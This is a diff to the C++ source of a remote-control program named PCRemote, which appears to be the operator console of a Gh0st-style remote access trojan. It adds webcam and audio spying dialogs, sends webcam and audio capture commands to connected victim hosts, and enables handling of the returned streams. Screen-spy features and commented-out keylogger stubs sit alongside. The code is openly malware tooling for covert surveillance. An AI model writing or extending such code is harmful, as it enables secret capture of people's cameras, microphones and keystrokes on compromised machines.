@@ -12,6 +12,8 @@
 #include "CSystemDlg.h"
 #include "CScreenSpyDlg.h"
 #include "FileManagerDlg.h"
+#include "AudioDlg.h"
+#include "WebCamDlg.h"
 
 
 #ifdef _DEBUG
@@ -156,6 +158,8 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
 	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
 	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
+	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
+	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
 
 END_MESSAGE_MAP()
 
@@ -554,6 +558,8 @@ void CPCRemoteDlg::OnNMRClickOnline(NMHDR* pNMHDR, LRESULT* pResult)
 void CPCRemoteDlg::OnOnlineAudio()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_AUDIO;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -599,6 +605,8 @@ void CPCRemoteDlg::OnOnlineServer()
 void CPCRemoteDlg::OnOnlineVideo()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_WEBCAM;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -628,13 +636,22 @@ void CPCRemoteDlg::OnOnlineDelete()
 {
 	// TODO: 在此添加命令处理程序代码
 	CString strIP;
-	int iSelect = m_CList_Online.GetSelectionMark();
-	strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);
-	strIP += "-";
-	strIP += m_CList_Online.GetItemText(iSelect, ONLINELIST_COMPUTER_NAME);
-	m_CList_Online.DeleteItem(iSelect);
-	strIP += " 主机断开连接";
-	ShowMessage(true, strIP);
+
+	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int iSelect = m_CList_Online.GetNextSelectedItem(pos);
+	
+		strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);
+		strIP += "-";
+		strIP += m_CList_Online.GetItemText(iSelect, ONLINELIST_COMPUTER_NAME);
+		m_CList_Online.DeleteItem(iSelect);
+		strIP += " 主机断开连接";
+		ShowMessage(true, strIP);
+
+	}
+
+	
 }
 
 
@@ -801,12 +818,12 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 		case SCREENSPY_DLG:
 			((CScreenSpyDlg*)dlg)->OnReceiveComplete();
 			break;
-	//	case WEBCAM_DLG:
-	//		((CWebCamDlg*)dlg)->OnReceiveComplete();
-	//		break;
-	//	case AUDIO_DLG:
-	//		((CAudioDlg*)dlg)->OnReceiveComplete();
-	//		break;
+		case WEBCAM_DLG:
+			((CWebCamDlg*)dlg)->OnReceiveComplete();
+			break;
+		case AUDIO_DLG:
+			((CAudioDlg*)dlg)->OnReceiveComplete();
+			break;
 	//	case KEYBOARD_DLG:
 	//		((CKeyBoardDlg*)dlg)->OnReceiveComplete();
 	//		break;
@@ -829,11 +846,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	break;
 	//case TOKEN_HEARTBEAT: // 回复心跳包
 	//{
-		//BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
-		//m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+	//	BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+	//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 	//}
-
-	break;
+	//break;
 	case TOKEN_LOGIN: // 上线包
 
 	{
@@ -861,12 +877,12 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
 		g_PCRemote->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
 		break;
-	//case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
-	//	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
-	//	break;
-	//case TOKEN_AUDIO_START: // 语音
-	//	g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
-	//	break;
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+		g_PCRemote->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+		break;
+	case TOKEN_AUDIO_START: // 语音
+		g_PCRemote->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+		break;
 	//case TOKEN_KEYBOARD_START:
 	//	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 	//	break;
@@ -1120,7 +1136,29 @@ LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+LRESULT CPCRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext* pContext = (ClientContext*)lParam;
+	CWebCamDlg* dlg = new CWebCamDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+	pContext->m_Dialog[0] = WEBCAM_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
 
+LRESULT CPCRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext* pContext = (ClientContext*)lParam;
+	CAudioDlg* dlg = new CAudioDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_AUDIO, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+	pContext->m_Dialog[0] = AUDIO_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
 
 
 
